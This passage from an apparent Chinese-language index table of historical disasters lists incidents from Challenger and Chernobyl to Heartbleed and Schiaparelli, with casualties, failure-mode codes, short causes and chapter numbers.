金融／資料完整性 | 0 死；指數 22 個月由 1000 默漂到 524.881（真值約 1009.811）、修正後跳回 1098.892 | F8、F11、F9、F3（floor 取代 round、單向誤差高頻累積；監控全綠卻一直錯——靜默資料損毀） | ch21 |\n| 1986 | 挑戰者號（STS-51-L） | 太空／航太 | 7 死 | F6、F13、F3、F8（O-ring 低溫失效＋偏差正常化） | ch14 |\n| 1986 | 車諾比 4 號機 | 核能 | 短期確認約 31 死；長期可歸因死亡估計差異極大，自約數千至數萬 ⚠️ | F4、F13、F6、F8、F11、F2（停用保護＋正空泡係數＋AZ-5 正向 scram） | ch17 |\n| 1988 | Morris 蠕蟲 | 資安／網際網路 | 0 死；估約 6,000 台、約當時連網機器 10% ⚠️ | F14、F8、F4、F7（1/7 重感染率把善意程式變 DoS） | ch18 |\n| 1991 | Sleipner A 平台沉沒 | 離岸工程／結構 | 0 死（無人測試）；損失估計約 7 億美元 ⚠️ | F9、F8、F2、F3（FEA 低估 tricell 剪應力約 47%） | ch09 |\n| 2002 | 于伯林根空中相撞 | 航空 | 71 死（含 46 名俄羅斯學童） | F2、F11、F5、F13、F3（TCAS RA 與 ATC 指令相牴觸） | ch06 |\n| 2003 | 哥倫比亞號（STS-107） | 太空／航太 | 7 死 | F6、F13、F3、F11（泡棉撞 RCC＋組織病灶與挑戰者同型復發） | ch15 |\n| 2009 | 法航 447 | 航空 | 228 死 | F5、F9、F11（pitot 結冰→自駕脫離→失速；失速警告反直覺） | ch05 |\n| 2010 | 2010 閃電崩盤 | 金融／自動交易 | 0 死；DJIA 盤中急跌約 998–1,000 點（約 9%）、名目蒸發約 1 兆美元、約 36 分鐘大致收復 | F7、F2、F5、F1（大型賣出演算法×HFT 撤離流動性；歸因有爭議 ⚠️） | ch11 |\n| 2014 | Heartbleed（CVE-2014-0160） | 資安／開源基礎設施 | 0 死；揭露時約 17%（約 50 萬台）HTTPS 伺服器易受攻擊 | F9、F8、F14、F3（缺邊界檢查、潛伏逾兩年、關鍵基礎設施缺資源） | ch19 |\n| 2016 | Schiaparelli 火星著陸器 | 太空／EDL | 0 死（無人探測器）；約 540 km/h 撞擊全毀 | F9、F8、F1、F10、F11（IMU 飽和→積分出負高度→誤判已著陸） | ch08 |\n| 20
